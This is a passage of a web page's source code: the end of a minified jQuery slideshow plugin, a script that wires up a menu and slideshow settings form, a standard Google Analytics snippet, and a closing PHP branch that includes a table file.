r=1}l(r)},j.config.intervalDuration)}return true};var b=function(){if(!j.config.displayList){return false}c();var w=j.plugin.find(".ps-list");var u=w.width();var r=j.plugin.find(".ps-list > ul");var v=r.width();if(v>u){r.css("margin","0 45px");var t=parseInt(r.css("margin-left"));var s=parseInt(r.css("margin-right"));u-=(t+s);w.find(".ps-prev").show().unbind("click").click(function(){var y=parseInt(r.css("left"));var x=y+u;if(y==0){x=-(v-u)}else{if(x>0){x=0}}if(typeof r.animate=="function"){r.animate({left:x},j.config.transitionDuration)}else{r.css("left",x)}});w.find(".ps-next").show().unbind("click").click(function(){var y=parseInt(r.css("left"));var x=y-u;var z=-(v-u);if(y==z){x=0}else{if(x<z){x=z}}if(typeof r.animate=="function"){r.animate({left:x},j.config.transitionDuration)}else{r.css("left",x)}});if(j.config.touchControls){j.plugin.find(".ps-list > ul").on("touchmove",function(C){try{if(C.originalEvent.touches[0].clientX){var G=(j.touchListLastPosition==false?0:j.touchListLastPosition);nbPixels=(j.touchListLastPosition==false?1:Math.abs(G-C.originalEvent.touches[0].clientX));j.touchListLastPosition=C.originalEvent.touches[0].clientX;var x="";if(G>C.originalEvent.touches[0].clientX){x="left"}else{if(G<C.originalEvent.touches[0].clientX){x="right"}}}var F=parseInt(r.css("left"));if(x=="left"){var E=w.width();var D=r.width();var z=parseInt(r.css("margin-left"));var B=parseInt(r.css("margin-right"));E-=(z+B);var A=-(D-E);var y=F-nbPixels;if(y>A){r.css("left",y)}}else{if(x=="right"){var y=F+nbPixels;if(y<0){r.css("left",y)}else{r.css("left",0)}}}}catch(C){j.touchListLastPosition=false}});j.plugin.find(".ps-list > ul").on("touchend",function(x){j.touchListLastPosition=false})}}else{var t=parseInt((u-v)/2);r.css("left",0).css("margin-left",t);w.find(".ps-prev").hide();w.find(".ps-next").hide();j.plugin.find(".ps-list > ul").unbind("touchstart touchmove touchend")}return true};var n=function(){var A=j.plugin.find(".ps-list").width();var y=j.plugin.find(".ps-list > ul");var z=y.width();var t=parseInt(y.css("margin-left"));var x=parseInt(y.css("margin-right"));A-=(t+x);var w=Math.abs(parseInt(y.css("left")));var r=w+A;var u=j.plugin.find(".ps-list .ps-selected").position().left;var s=u+j.plugin.find(".ps-list .ps-selected").width();if((u<w)||(s>r)||(z>A&&r>s)){var v=-(z-A);if(-u<v){y.css("left",v)}else{y.css("left",-u)}}return true};j.startSlide=function(){j.config.autoSlide=true;k();return true};j.stopSlide=function(){j.config.autoSlide=false;clearInterval(j.intervalEvent);return true};j.getCurrentSlide=function(){return j.currentSlide};j.getSlideCount=function(){return j.slideCount};j.displaySlide=function(r){l(r,true);return true};j.nextSlide=function(){if(j.currentSlide+1<=j.slideCount){var r=j.currentSlide+1}else{var r=1}l(r,true,"left");return true};j.previousSlide=function(){if(j.currentSlide-1>=1){var r=j.currentSlide-1}else{var r=j.slideCount}l(r,true,"right");return true};j.destroy=function(r){clearInterval(j.intervalEvent);if(typeof r!="undefined"){j.plugin.find(".ps-list > ul > li").each(function(){a(this).attr("style",null).removeClass().unbind("click");a(this).html(a(this).find("span").html())});j.plugin.find(".ps-current").remove();j.plugin.find(".ps-list").find(".ps-prev, .ps-next").remove();j.plugin.find(".ps-list > ul").addClass(j.config.mainClassName).attr("style","");j.plugin.find(".ps-list > ul").unwrap().unwrap();j.hide()}else{j.parent().parent().remove()}j.plugin=null;j.data=[];j.config={};j.currentSlide=0;j.slideCount=0;j.resizeEvent=null;j.intervalEvent=null;j.touchFirstPosition=null;j.window=null;return true};j.reload=function(r){j.destroy(true);j=this;j.plugin=this;j.window=a(window);j.plugin.show();j.config=a.extend({},i,r);g();j.window.resize(function(){clearTimeout(j.resizeEvent);j.resizeEvent=setTimeout(function(){e();var s=j.plugin.find(".ps-current > ul > li.elt_"+j.currentSlide+" img").css("max-height","").height();h(s);if(j.config.displayList){b();n()}},100)});if(j.config.autoSlide){k()}return true};p();return this}})(window.Zepto||window.jQuery);
</script>
<script type="text/javascript">
$('.pgwMenu').pgwMenu();
$('a[data-goto]').click(function() { pgwjs.goTo($(this).attr('data-goto')); });
var pgwSlideshow=$('.pgwSlideshow').pgwSlideshow();function reloadSlideshow(){var newConfig={};var style=$('input[name=\"style\"]:checked').val();if(style=='light'){newConfig.mainClassName='pgwSlideshowLight';}var listPosition=$('input[name=\"listPosition\"]:checked').val();if(listPosition=='none'){newConfig.displayList=false;}else{newConfig.listPosition=listPosition;}newConfig.transitionEffect=$('input[name=\"transitionEffect\"]:checked').val();if($('#displayList:checked').val()=='true'){newConfig.displayList=true;}else{newConfig.displayList=false;}if($('#displayControls:checked').val()=='true'){newConfig.displayControls=true;}else{newConfig.displayControls=false;}if($('#maxHeight:checked').val()=='true'){newConfig.maxHeight=450;}pgwSlideshow.reload(newConfig);}$('.slideshowConfig input').bind('change',function(){reloadSlideshow()});
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
ga('create', 'UA-86926180-1', 'auto');
ga('send', 'pageview');
</script>
</div>
</body>
</html>
<?php }else{ include_once './table.php'; } ?>